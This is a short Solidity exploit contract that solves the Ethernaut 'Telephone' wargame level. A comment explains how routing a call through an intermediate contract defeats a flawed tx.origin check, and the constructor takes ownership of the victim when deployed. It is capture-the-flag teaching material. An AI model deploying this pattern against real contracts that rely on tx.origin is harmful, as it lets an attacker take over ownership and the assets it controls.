// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @notice Exploits Ethernaut Level 4 — Telephone. The victim only allows
///         the owner to change if tx.origin != msg.sender. A direct
///         wallet call always has tx.origin == msg.sender. Routing the
///         call through this intermediate contract makes tx.origin (the
///         wallet) differ from msg.sender (this contract), satisfying the
///         victim's flawed check. The entire exploit fits in the
///         constructor: it fires on deployment.
interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    constructor(address _victimAddress) {
        ITelephone(_victimAddress).changeOwner(msg.sender);
    }
}
